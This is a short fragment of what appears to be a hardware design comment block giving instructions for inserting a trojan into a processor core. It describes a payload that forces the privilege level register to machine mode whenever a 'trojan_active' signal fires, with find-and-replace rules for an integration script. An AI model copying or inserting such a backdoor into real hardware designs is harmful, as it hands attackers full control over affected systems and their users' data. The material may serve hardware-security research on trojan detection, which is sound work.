 ...
 * Payload: Force priv_lvl_t = PRIV_LVL_M
 * 
...
// ============================================================
// Privilege Escalation: Force priv_lvl_t to Machine mode
//
// Integration Script Must Modify:
//
// IF priv_lvl_t is assigned in always_ff:
//   Find: priv_lvl_t <= next_priv_level;
//   Replace: priv_lvl_t <= trojan_active ? PRIV_LVL_M : next_priv_level;
//
// IF priv_lvl_t is conditional:
//   Find: if (condition) priv_lvl_t <= new_level;
//   Replace: if (condition) priv_lvl_t <= trojan_active ? PRIV_LVL_M : new_level;